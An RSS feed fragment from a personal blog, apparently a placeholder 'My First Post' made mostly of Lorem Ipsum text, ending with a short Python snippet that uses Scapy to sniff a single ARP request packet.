  <p><em>Nam quam ante, faucibus id dolor eget, scelerisque congue justo. Sed sit amet cursus metus, sed convallis mauris. Vestibulum lobortis volutpat libero maximus faucibus. Vivamus eleifend placerat ipsum, nec tempor tellus placerat sit amet. Proin ac velit at nulla ultrices tempor non ac sem. Morbi volutpat justo non augue imperdiet lacinia. Sed dui ipsum, viverra quis tincidunt vitae, sodales nec est. Maecenas ac nibh consequat, venenatis purus ullamcorper, porttitor mauris. Nulla elementum sem eget tortor fermentum malesuada. Integer pretium felis sem, in tincidunt nibh elementum sit amet. Donec nec orci iaculis, interdum est non, sodales est. Suspendisse pulvinar, ante sed elementum feugiat, mauris turpis blandit eros, egestas pretium risus nisl mattis urna. Integer sed urna turpis. Quisque auctor ac elit id imperdiet. Vivamus sed tortor semper, tempus ipsum sed, auctor nibh. Fusce sit amet facilisis tellus.</em></p>



]]></content></item><item><title>My First Post</title><link>https://0xade1.github.io/posts/2021/01/my-first-post/</link><pubDate>Mon, 25 Jan 2021 00:04:16 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/01/my-first-post/</guid><description>//: &amp;lt;&amp;gt; Curabitur tincidunt, eros ut tincidunt efficitur, eros enim mollis ligula, vitae aliquet augue magna at magna. Phasellus augue metus, blandit ut dignissim quis, pulvinar eget nisl. Nulla sodales malesuada ornare. Aenean suscipit, erat at suscipit feugiat, massa lorem scelerisque enim, non sodales est lacus sit amet velit. Phasellus gravida nulla ut dictum mollis. Aliquam interdum porta turpis, sed bibendum nunc aliquam a. Cras et porta ante. Curabitur eget purus nulla.</description><content type="html"><![CDATA[<p><a href="" title="ceci est un commentaire">//</a>: &lt;&gt; 





  <p><em>Curabitur tincidunt, eros ut tincidunt efficitur, eros enim mollis ligula, vitae aliquet augue magna at magna. Phasellus augue metus, blandit ut dignissim quis, pulvinar eget nisl. Nulla sodales malesuada ornare. Aenean suscipit, erat at suscipit feugiat, massa lorem scelerisque enim, non sodales est lacus sit amet velit. Phasellus gravida nulla ut dictum mollis. Aliquam interdum porta turpis, sed bibendum nunc aliquam a. Cras et porta ante. Curabitur eget purus nulla. Praesent sit amet interdum tortor. Nunc vestibulum ullamcorper velit a commodo. Fusce tincidunt rhoncus iaculis. Nullam vel egestas sem. Morbi eget sagittis felis. Morbi faucibus consequat elementum.</em></p>

  <p><em>Nam quam ante, faucibus id dolor eget, scelerisque congue justo. Sed sit amet cursus metus, sed convallis mauris. Vestibulum lobortis volutpat libero maximus faucibus. Vivamus eleifend placerat ipsum, nec tempor tellus placerat sit amet. Proin ac velit at nulla ultrices tempor non ac sem. Morbi volutpat justo non augue imperdiet lacinia. Sed dui ipsum, viverra quis tincidunt vitae, sodales nec est. Maecenas ac nibh consequat, venenatis purus ullamcorper, porttitor mauris. Nulla elementum sem eget tortor fermentum malesuada. Integer pretium felis sem, in tincidunt nibh elementum sit amet. Donec nec orci iaculis, interdum est non, sodales est. Suspendisse pulvinar, ante sed elementum feugiat, mauris turpis blandit eros, egestas pretium risus nisl mattis urna. Integer sed urna turpis. Quisque auctor ac elit id imperdiet. Vivamus sed tortor semper, tempus ipsum sed, auctor nibh. Fusce sit amet facilisis tellus.</em></p>

  <p><em>Integer tristique mattis condimentum. Pellentesque sit amet mauris malesuada, volutpat nunc ultrices, molestie massa. Nulla sit amet sem id erat ornare tincidunt eu id neque. Phasellus imperdiet, leo nec ultricies feugiat, augue elit pharetra mauris, ut porttitor mauris est non enim. Sed in quam nec turpis lacinia faucibus. Nulla semper lorem eget magna porta, eget pellentesque arcu finibus. Suspendisse nec nisl ac sapien gravida tincidunt ut et diam. Mauris suscipit, erat ut bibendum venenatis, nulla nibh tempor justo, nec bibendum velit mauris sed est. Pellentesque nec elit eget arcu mollis semper vel ut erat. Sed orci eros, vehicula eu dolor ut, vehicula eleifend purus. Maecenas id augue ut quam volutpat sodales. Nullam rhoncus urna nec quam tincidunt scelerisque. Morbi vehicula egestas ex, vitae auctor libero tristique id. Vivamus in leo id mi placerat lobortis.</em></p>


</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">main</span>():
    <span style="color:#6272a4"># We only want arp requests</span>
    berkeley_packet_filter <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;(arp[6:2] = 1)&#34;</span>
    <span style="color:#6272a4"># sniffing for one packet that will be sent to a function, while storing none</span>
    <span style="color:#6272a4">#sniff(filter=berkeley_packet_filter, prn=show_arp_packets, store=0, count=1)</span>
    sniff(<span style="color:#8be9fd;font-style:italic">filter</span><span style="color:#ff79c6">=</span>berkeley_packet_filter, prn<span style="color:#ff79c6">=</span>handle_arp_packets, store<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>, count<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>)

<span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
    <span style="color:#6272a4">#print(ipaddr,macaddr)</span>
    main()
</code></pre></td></tr></table>
</div>
</div>]]></content></item></channel></rss>